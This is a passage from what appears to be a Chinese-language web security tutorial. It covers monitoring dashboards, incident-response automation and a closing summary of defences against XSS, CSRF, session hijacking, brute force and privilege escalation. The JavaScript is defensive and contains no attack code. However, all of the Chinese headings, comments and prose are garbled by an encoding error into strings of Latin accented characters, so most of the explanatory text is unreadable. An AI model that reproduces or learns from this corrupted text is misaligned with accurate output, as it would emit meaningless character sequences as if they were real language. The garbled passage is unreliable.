    login: { windowMs: 15 * 60 * 1000, max: 5 }, // 15åˆ†é’Ÿ5æ¬¡
    api: { windowMs: 60 * 1000, max: 100 }       // 1åˆ†é’Ÿ100æ¬¡
  }
};
```

## 9.4 ç›‘æ§å‘Šè­¦ä½“ç³»



**ğŸ“Š å®æ—¶ç›‘æ§æŒ‡æ ‡**
```javascript
// å®‰å…¨ç›‘æ§ä»ªè¡¨æ¿
const securityMetrics = {
  // å®æ—¶å¨èƒç»Ÿè®¡
  threatStats: {
    xssAttempts: 0,
    csrfAttempts: 0,
    bruteForceAttempts: 0,
    unauthorizedAccess: 0
  },
  
  // ç”¨æˆ·è¡Œä¸ºåˆ†æ
  userBehavior: {
    failedLogins: new Map(),
    suspiciousActivities: [],
    blockedIPs: new Set()
  },
  
  // ç³»ç»Ÿå¥åº·çŠ¶æ€
  systemHealth: {
    authenticationErrors: 0,
    sessionAnomalies: 0,
    privilegeEscalations: 0
  },
  
  // ç”Ÿæˆå®‰å…¨æŠ¥å‘Š
  generateSecurityReport() {
    return {
      timestamp: new Date().toISOString(),
      threats: this.threatStats,
      userSecurity: {
        totalUsers: this.getTotalUsers(),
        activeAttacks: this.getActiveAttacks(),
        riskLevel: this.calculateRiskLevel()
      },
      recommendations: this.getSecurityRecommendations()
    };
  }
};
```

## 9.5 åº”æ€¥å“åº”æµç¨‹



**ğŸš¨ å®‰å…¨äº‹ä»¶å“åº”**
```javascript
// å®‰å…¨äº‹ä»¶å“åº”ç³»ç»Ÿ
const incidentResponse = {
  // äº‹ä»¶åˆ†çº§
  classifyIncident(incident) {
    const severity = {
      'LOW': ['failed_login', 'suspicious_activity'],
      'MEDIUM': ['privilege_escalation', 'session_hijack'],
      'HIGH': ['data_breach', 'system_compromise'],
      'CRITICAL': ['mass_data_loss', 'complete_system_takeover']
    };
    
    for (const [level, types] of Object.entries(severity)) {
      if (types.includes(incident.type)) {
        return level;
      }
    }
    return 'LOW';
  },
  
  // è‡ªåŠ¨å“åº”æªæ–½
  async autoResponse(incident) {
    const severity = this.classifyIncident(incident);
    
    switch(severity) {
      case 'CRITICAL':
        await this.emergencyShutdown();
        await this.notifyAllStakeholders(incident);
        break;
        
      case 'HIGH':
        await this.isolateAffectedSystems();
        await this.escalateToSecurityTeam(incident);
        break;
        
      case 'MEDIUM':
        await this.implementMitigationMeasures(incident);
        await this.alertSecurityTeam(incident);
        break;
        
      case 'LOW':
        await this.logIncident(incident);
        await this.monitorForEscalation(incident);
        break;
    }
  },
  
  // æ¢å¤æµç¨‹
  async recoveryProcess(incident) {
    // 1. è¯„ä¼°æŸå¤±
    const damage = await this.assessDamage(incident);
    
    // 2. ä¿®å¤æ¼æ´
    await this.patchVulnerabilities(incident);
    
    // 3. æ¢å¤æœåŠ¡
    await this.restoreServices(damage);
    
    // 4. äº‹ååˆ†æ
    await this.postIncidentAnalysis(incident);
  }
};
```

---

# ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“



## å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ



**ğŸ”¥ æœ€é‡è¦çš„å®‰å…¨å¨èƒ**ï¼š
- **CSRF** - è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œç”¨Tokené˜²æŠ¤
- **XSS** - è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œè¾“å…¥è¿‡æ»¤+è¾“å‡ºè½¬ä¹‰
- **ä¼šè¯åŠ«æŒ** - å·å–Cookieå†’å……èº«ä»½ï¼ŒHttpOnly+Secureé˜²æŠ¤
- **æš´åŠ›ç ´è§£** - è‡ªåŠ¨å°è¯•å¯†ç ï¼Œè´¦æˆ·é”å®š+éªŒè¯ç é˜²æŠ¤
- **æƒé™æå‡** - è·å¾—è¶…è¶Šæƒé™ï¼Œæœ€å°æƒé™åŸåˆ™+å®¡è®¡ç›‘æ§

## å…³é”®é˜²æŠ¤ç­–ç•¥



**ğŸ›¡ï¸ å¤šå±‚é˜²æŠ¤åŸåˆ™**ï¼š
```
ç”¨æˆ·æ•™è‚² â†’ ç½‘ç»œä¼ è¾“ â†’ åº”ç”¨ç½‘å…³ â†’ è®¤è¯æˆæƒ â†’ åº”ç”¨é€»è¾‘ â†’ æ•°æ®è®¿é—®
æ¯ä¸€å±‚éƒ½è¦æœ‰ç›¸åº”çš„å®‰å…¨æªæ–½ï¼Œä¸èƒ½ä¾èµ–å•ä¸€é˜²æŠ¤
```

**âš¡ å®æ—¶ç›‘æ§å‘Šè­¦**ï¼š
- å¼‚å¸¸ç™»å½•è¡Œä¸ºæ£€æµ‹
- æƒé™è®¿é—®å®¡è®¡æ—¥å¿—
- è‡ªåŠ¨åŒ–å®‰å…¨å“åº”
- å®šæœŸå®‰å…¨è¯„ä¼°

## å®é™…åº”ç”¨å»ºè®®



**ğŸ¯ ä¼˜å…ˆçº§æ’åº**ï¼š
1. **P1é«˜ä¼˜å…ˆçº§** - HTTPSã€åŸºç¡€è®¤è¯ã€è¾“å…¥éªŒè¯
2. **P2ä¸­ä¼˜å…ˆçº§** - CSRFé˜²æŠ¤ã€ä¼šè¯å®‰å…¨ã€æƒé™æ§åˆ¶
3. **P3ä½ä¼˜å…ˆçº§** - é«˜çº§ç›‘æ§ã€è¡Œä¸ºåˆ†æã€å¨èƒæƒ…æŠ¥

**ğŸ’¡ è®°å¿†è¦ç‚¹**ï¼š
- å®‰å…¨æ˜¯ç³»ç»Ÿæ€§å·¥ç¨‹ï¼Œéœ€è¦å¤šå±‚é˜²æŠ¤
- ç”¨æˆ·æ•™è‚²å’ŒæŠ€æœ¯é˜²æŠ¤åŒæ ·é‡è¦
- ç›‘æ§å‘Šè­¦æ¯”è¢«åŠ¨é˜²æŠ¤æ›´æœ‰æ•ˆ
- å®šæœŸæ›´æ–°å’Œæ¼”ç»ƒåº”æ€¥å“åº”æµç¨‹

**æ ¸å¿ƒè®°å¿†å£è¯€**ï¼š
```
Webå®‰å…¨é˜²æŠ¤è¦å…¨é¢ï¼Œå¤šå±‚é˜²æŠ¤æ˜¯å…³é”®
CSRFç”¨Tokenæ¥é˜²æŠ¤ï¼ŒXSSè¿‡æ»¤è¦åšå¥½
ä¼šè¯å®‰å…¨Cookieé”ï¼Œæš´åŠ›ç ´è§£æœ‰é™åˆ¶
æƒé™æœ€å°ç›‘æ§ä¸¥ï¼Œå¼‚å¸¸å‘Šè­¦å“åº”å¿«
```